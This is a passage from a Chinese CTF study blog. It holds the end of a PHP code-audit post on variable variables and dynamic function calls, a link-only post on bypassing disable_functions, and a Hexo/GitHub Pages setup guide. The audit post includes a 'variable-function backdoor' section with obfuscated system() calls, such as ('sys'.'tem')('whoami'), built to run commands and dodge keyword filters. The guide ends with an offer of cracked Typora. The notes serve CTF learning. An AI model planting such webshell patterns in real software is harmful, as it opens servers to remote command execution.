<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">foo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$bar</span> = <span class="string">&#x27;I am bar.&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;I am A.&#x27;</span>, <span class="string">&#x27;I am B.&#x27;</span>, <span class="string">&#x27;I am C.&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$r</span>   = <span class="string">&#x27;I am r.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">foo</span>();</span><br><span class="line"><span class="variable">$bar</span> = <span class="string">&#x27;bar&#x27;</span>;</span><br><span class="line"><span class="variable">$baz</span> = <span class="keyword">array</span>(<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>, <span class="string">&#x27;baz&#x27;</span>, <span class="string">&#x27;quux&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>-&gt;<span class="variable">$bar</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>-&gt;&#123;<span class="variable">$baz</span>[<span class="number">1</span>]&#125; . <span class="string">&quot;\n&quot;</span>;   <span class="comment">// 等同于 $foo-&gt;bar。因此，输出结果也是 &#x27;I am bar.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$end</span>   = <span class="string">&#x27;ar&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>-&gt;&#123;<span class="variable">$start</span>.<span class="variable">$end</span>&#125; . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="string">&#x27;arr&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$foo</span>-&gt;&#123;<span class="variable">$arr</span>[<span class="number">1</span>]&#125; . <span class="string">&quot;\n&quot;</span>; <span class="comment">// 所以 $foo-&gt;&#123;$arr[1]&#125; 实际上是  $foo-&gt;r</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>可变变量</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>;</span><br><span class="line"><span class="keyword">echo</span> $&#123;<span class="variable">$a</span>&#125;;  </span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line"><span class="variable">$ab</span> = <span class="string">&#x27;cccc&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $&#123;<span class="variable">$a</span>.<span class="variable">$b</span>&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>动态函数</strong><ol>
<li><p><strong>动态执行函数</strong></p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;phPinfo&#x27;</span>; <span class="comment">#php 的函数忽略大小写，但是变量严格大小写，这样写没问题 而且直接调用 PHpinfo 也不会报错</span></span><br><span class="line"><span class="variable">$a</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>动态实例化类</strong></p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="keyword">new</span> <span class="variable">$a</span>();</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>可变函数后门</strong></p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```<span class="title function_ invoke__">php</span></span><br><span class="line">(<span class="string">&#x27;sys&#x27;</span>.<span class="string">&#x27;tem&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">join</span>(<span class="string">&quot;&quot;</span>,[<span class="string">&quot;sys&quot;</span>,<span class="string">&quot;tem&quot;</span>])(<span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">implode</span>([<span class="string">&#x27;sys&#x27;</span>,<span class="string">&#x27;tem&#x27;</span>])(<span class="string">&quot;ipconfig&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<ol start="6">
<li><strong>深入理解 <code>$_REQUEST</code> 数组</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<ul>
<li>这行代码会输出 <code>$_REQUEST</code> 数组中键为 ‘a’ 的值。<code>$_REQUEST</code> 是一个包含了 <code>$_GET</code>、<code>$_POST</code> 和 <code>$_COOKIE</code> 数据的数组，默认情况下，它的顺序是先处理 <code>$_POST</code>，然后是 <code>$_GET</code>，最后是 <code>$_COOKIE</code>。</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" data-id="cm0kx5k5b000fo8dkgfgdf4dq" data-title="php代码审计" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-绕过Disable-function" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/" class="article-date">
  <time class="dt-published" datetime="2024-08-31T04:47:42.000Z" itemprop="datePublished">2024-08-31</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTF-web/">CTF-web</a>►<a class="article-category-link" href="/categories/CTF-web/rce/">rce</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/">绕过Disable_function</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="绕过Disable-function"><a href="#绕过Disable-function" class="headerlink" title="绕过Disable_function"></a>绕过Disable_function</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10057">https://xz.aliyun.com/t/10057</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p>
<p><a target="_blank" rel="noopener" href="https://christa.top/details/21/">https://christa.top/details/21/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/" data-id="cm0kx5k5f000vo8dkauhe0tny" data-title="绕过Disable_function" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-如何搭建一篇博客2024版" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/" class="article-date">
  <time class="dt-published" datetime="2024-08-30T11:44:14.000Z" itemprop="datePublished">2024-08-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/">如何搭建一篇博客2024版</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="一：环境和工具准备："><a href="#一：环境和工具准备：" class="headerlink" title="一：环境和工具准备："></a>一：环境和工具准备：</h2><p>1.系统（Windows10 11）<br>2.Node js<br>3.Git<br>4.hexo<br>5.文本编辑器<br>6.一个Github账号</p>
<h2 id="二-Node-js的安装："><a href="#二-Node-js的安装：" class="headerlink" title="二.Node js的安装："></a>二.Node js的安装：</h2><p>1.打开Node官网，下载Node js安装程序，下载地址：<a target="_blank" rel="noopener" href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a><br>2.下载后安装，安装目录尽量默认，除非你对它非常了解。<br>3.安装完成后，检查是否安装成功。打开cmd窗口，输入：node -v，看到了<br>版本信息，代表安装成功。<br>4.修改下载源。npm下载各种模块，默认是从国外的服务器下载，速度较慢，把它换成国内镜像，打开cmd窗口，运行命令：npm config set registry <a target="_blank" rel="noopener" href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p>
<p>国内访问 npm 官方源可能会有速度较慢或者不稳定的问题，可以切换到国内镜像源，如淘宝镜像：</p>
<p>npm config set registry <a target="_blank" rel="noopener" href="https://registry.npmmirror.com/">https://registry.npmmirror.com/</a></p>
<h2 id="三-安装Git："><a href="#三-安装Git：" class="headerlink" title="三.安装Git："></a>三.安装Git：</h2><p>1.进入官网：<a target="_blank" rel="noopener" href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ，由于官网下载太慢可以通过淘宝的开源镜像下载 网址：<a target="_blank" rel="noopener" href="https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/">https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/</a><br>2.下载后傻瓜式安装即可，安装目录可以默认，可以自选。<br>3.在桌面右键，出现Open Git Bash here即代表安装成功。</p>
<h2 id="四-安装Hexo："><a href="#四-安装Hexo：" class="headerlink" title="四.安装Hexo："></a>四.安装Hexo：</h2><p>1.右键Git Bash输入如下命令安装：npm install -g hexo-cli<br>2.安装完后输入hexo -v验证，出现版本号即代表成功。</p>
<h2 id="五-Github与仓库的创建"><a href="#五-Github与仓库的创建" class="headerlink" title="五.Github与仓库的创建"></a>五.Github与仓库的创建</h2><p>1.进入官网：<a target="_blank" rel="noopener" href="https://github.com/">https://github.com/</a><br>2.点击右上角Sign up进行注册：<br>3.填写自己的邮箱、密码、用户名等信息，然后用邮箱验证即可完成。<br>4.注册完成后，点击右上角+按钮，选择New repository，创建一个名称为用户名.github.io<br>的仓库。</p>
<p>注意：1.名称必须为你的用户名.github.io,不然会404<br>  2.Description：为描述仓库。（选填）<br>  3.勾选 Initialize this repository with a README 初始化一个 README.md文件。<br>  4.点击 Creat repository 进行创建。</p>
<h2 id="六-环境配置："><a href="#六-环境配置：" class="headerlink" title="六.环境配置："></a>六.环境配置：</h2><p>1.配置用户名和邮箱：<br><code>git config --global user.name &quot;你的用户名&quot; git config --global user.email &quot;你的邮箱&quot;</code><br>2.通过 <code>git config -l</code>检查是否配置成功，现在git安装及配置全部完成。</p>
<h2 id="七-连接至Github："><a href="#七-连接至Github：" class="headerlink" title="七.连接至Github："></a>七.连接至Github：</h2><p>1.执行以下命令生成ssh公钥，它用于你的计算机连接Github。<br><code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code></p>
<p>2.将 SSH KEY 配置到 GitHub<br>进入Github，点击右上角头像，选择settings，进入设置后选择 SSH and GPG keys，<br>名字尽量写英文的，把刚才复制的公钥填到 Key 那一栏。完成后保存。</p>
<p>3.测试连接，输入以下命令：<br><code>ssh -T git@github.com</code><br>出现连接到账户的提示信息，说明大功告成，现在完成了环境准备工作。</p>
<h2 id="八-初始化Hexo项目"><a href="#八-初始化Hexo项目" class="headerlink" title="八.初始化Hexo项目"></a>八.初始化Hexo项目</h2><p>1.在你想放博客文件的路径打开GBH，执行下列命令初始化项目。（把blog后面的东西删掉）<br><code>hexo init blog(项目名)</code><br>2.进入blog文件夹，再次右键GBH，输入 <code>npm i</code>安装相关依赖。</p>
<p>3.安装完成后，blog文件夹内有如下结构：<br>【node_modules】：依赖包<br>【scaffolds】：生成文章的一些模板<br>【source】：用来存放你的文章<br>【themes】：主题<br>【.npmignore】：发布时忽略的文件（可忽略）<br>【_config.landscape.yml】：主题的配置文件<br>【config.yml】：博客的配置文件<br>【package.json】：项目名称、描述、版本、运行和开发等信息</p>
<p>4.输入hexo s启动项目</p>
<h2 id="九-更换主题"><a href="#九-更换主题" class="headerlink" title="九.更换主题"></a>九.更换主题</h2><p>github：<a target="_blank" rel="noopener" href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml</a></p>
<h2 id="十-页面个性化"><a href="#十-页面个性化" class="headerlink" title="十.页面个性化"></a>十.页面个性化</h2><ol>
<li>浏览器tab页名称<br>修改根目录下 _config.yml 中的 title 字段。<br>subtitle为副标题<br>description不用填写<br>keywords关键词，可不填写<br>author博客所有者<br>language语言，中国大陆使用zh-CN<br>timezone不用填写</li>
</ol>
<p>2.博客导航栏左侧文字<br>blog目录下_config.fluid.yml中的blog_title 字段。</p>
<p>3.首页正中间的文字<br>blog目录下_config.fluid.yml中的text字段。</p>
<h2 id="十一-将静态博客挂载到Github-Pages"><a href="#十一-将静态博客挂载到Github-Pages" class="headerlink" title="十一.将静态博客挂载到Github Pages"></a>十一.将静态博客挂载到Github Pages</h2><p>方案一（玄学）</p>
<p>1.安装 hexo-deployer-git，输入以下命令：<br><code>npm install hexo-deployer-git --save</code><br>2.修改根目录下的 _config.yml，配置 GitHub 相关信息</p>
<p>deploy:<br>type: git<br>repository: <a target="_blank" rel="noopener" href="https://github.com/XXX/XXX.github.io.git">https://github.com/XXX/XXX.github.io.git</a><br>branch: main<br>token: XXXXXXXXXXXXX（要获取）</p>
<p>repository获取方式为：<br>进入<a target="_blank" rel="noopener" href="https://github.com/">https://github.com/</a>,<br>点击右上角三条杠，点击你新建的用户名.github.io的仓库<br>点击中间那个绿色的Code按钮，选择左边的 Local 下面三个选项里选SSH,复制那个链接即可</p>
<p>其中 token 为 GitHub 的 Personal access tokens，获取方式如下图：<br>token只会出现一次，复制下来妥善保存，如果丢失，则要重新生成。</p>
<p>部署到Github：<br>先输入hexo clean清除缓存<br>再输入命令<code>hexo g -d</code></p>
<p>部署完成后等待两分钟，浏览器访问：https:&#x2F;&#x2F;你的GitHub用户名.github.io<br>能正常访问即部署成功。<br>但是很玄学，我上课前还可以，下课试试就不出来了，呜呜呜</p>
<h2 id="我的方案："><a href="#我的方案：" class="headerlink" title="我的方案："></a>我的方案：</h2><p>1.安装 hexo-deployer-git，输入以下命令：<br><code>npm install hexo-deployer-git --save</code></p>
<p>2.使用国内镜像源</p>
<ul>
<li><p>国内访问 npm 官方源可能会有速度较慢或者不稳定的问题，可以切换到国内镜像源，如淘宝镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npmmirror.com/</span><br></pre></td></tr></table></figure></li>
</ul>
<p>之后再尝试重新安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>3.配置 Hexo 部署到 GitHub Pages</p>
<p>打开你的 Hexo 项目根目录下的 <code>_config.yml</code> 文件，找到或添加 <code>deploy</code> 配置部分，按照以下示例进行配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/你的用户名/你的仓库名.github.io.git</span><br><span class="line">  branch: main</span><br><span class="line">  token: 你的GitHub个人访问令牌</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：</p>
<ul>
<li><code>repository</code>：将此项替换为你 GitHub Pages 仓库的地址，格式通常为 <code>https://github.com/你的用户名/你的用户名.github.io.git</code>。</li>
<li><code>branch</code>：通常为 <code>main</code>，也可能是 <code>master</code>，视你的仓库配置而定。</li>
<li><code>token</code>：GitHub 的 Personal access token，用于身份验证。你可以在 GitHub 的 <a target="_blank" rel="noopener" href="https://github.com/settings/tokens">Personal access tokens</a> 页面生成一个新令牌。</li>
</ul>
<p><strong>理缓存并生成部署</strong></p>
<ul>
<li><p>在终端中执行以下命令，清理缓存并生成静态文件，然后部署到 GitHub：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo generate</span><br><span class="line">hexo deploy</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>检查部署</strong></p>
<ul>
<li>部署完成后，等待几分钟后访问 <code>https://你的用户名.github.io</code>，查看你的博客是否成功部署。</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先，在本地创建一篇新的文章。你可以使用 Hexo 提供的命令来生成一篇新文章的文件。</p>
<p><code>hexo new &quot;文章标题&quot;</code></p>
<p>这将会在 <code>source/_posts/</code> 目录下生成一个 <code>我的新文章.md</code> 文件。</p>
<h3 id="创建关于页面"><a href="#创建关于页面" class="headerlink" title="创建关于页面"></a>创建关于页面</h3><p>hexo new page about</p>
<h3 id="配置分类页面"><a href="#配置分类页面" class="headerlink" title="配置分类页面"></a>配置分类页面</h3><p>确保 <code>source/about/index.md</code> 文件中有内容。即使是一个简单的标题和段落也可以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 关于我</span><br><span class="line">date: 2024-08-31 12:00:00</span><br><span class="line"></span><br><span class="line">这里是关于页面的内容。</span><br></pre></td></tr></table></figure>

<h3 id="创建分类页面"><a href="#创建分类页面" class="headerlink" title="创建分类页面"></a>创建分类页面</h3><p>hexo new page categories</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">title: 关于我 </span><br><span class="line">date: 2024-08-31 12:00:00 </span><br><span class="line">--- 这里是关于页面的内容。</span><br></pre></td></tr></table></figure>

<h3 id="配置分类页面-1"><a href="#配置分类页面-1" class="headerlink" title="配置分类页面"></a>配置分类页面</h3><p>编辑 <code>source/categories/index.md</code> 文件，确保它正确配置为展示所有分类：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title: 分类</span><br><span class="line">layout: categories</span><br></pre></td></tr></table></figure>

<h3 id="生成标签页面"><a href="#生成标签页面" class="headerlink" title="生成标签页面"></a>生成标签页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure>

<h3 id="配置标签页面"><a href="#配置标签页面" class="headerlink" title="配置标签页面"></a>配置标签页面</h3><p>接下来，编辑 <code>source/tags/index.md</code> 文件，以确保它正确显示标签列表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">title: 标签</span><br><span class="line">layout: tags</span><br></pre></td></tr></table></figure>



<p>然后就可以写文件了</p>
<p>只需要注意前面是像：</p>
<p>title: 绕过Disable_function<br>date: 2024-08-31 12:47:42<br>categories: CTF-web rce<br>tags: web php       这样的</p>
<h3 id="三步建立法"><a href="#三步建立法" class="headerlink" title="三步建立法"></a>三步建立法</h3><p>hexo clean  </p>
<p>hexo generate</p>
<p>hexo server</p>
<p>然后在浏览器中访问 <code>http://localhost:4000/about/</code></p>
<p>什么没有好的md编辑器还要用vs和clion就out了，到224找我，破解的免费typora不用谢</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/" data-id="cm0kx5k5e000ro8dk9z0t00hr" data-title="如何搭建一篇博客2024版" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/">CTF-web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/php%E5%AE%A1%E8%AE%A1/">php审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/rce/">rce</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/">文件操作</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%89%BA%E6%9C%AF/">艺术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%A9%E5%91%BD%E6%8B%82%E6%99%93/">革命拂晓</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-php/" rel="tag">web php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" rel="tag">文字感悟</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83/" rel="tag">环境</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" rel="tag">自己的艺术</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/web-php/" style="font-size: 20px;">web php</a> <a href="/tags/%E6%96%87%E5%AD%97%E6%84%9F%E6%82%9F/" style="font-size: 10px;">文字感悟</a> <a href="/tags/%E7%8E%AF%E5%A2%83/" style="font-size: 15px;">环境</a> <a href="/tags/%E8%87%AA%E5%B7%B1%E7%9A%84%E8%89%BA%E6%9C%AF/" style="font-size: 10px;">自己的艺术</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/09/">September 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/08/">August 2024</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2024/09/01/%E9%9A%90%E5%86%99%E7%B3%BB%E5%88%97/">隐写系列</a>
          </li>
        
          <li>
            <a href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/">脚本工具</a>
          </li>
        
          <li>
            <a href="/2024/09/01/ssrf/">ssrf</a>
          </li>
        
          <li>
            <a href="/2024/09/01/jwt%E7%AD%89%E8%AE%A4%E8%AF%81went/">jwt等认证went</a>
          </li>
        
          <li>
            <a href="/2024/09/01/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2024 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>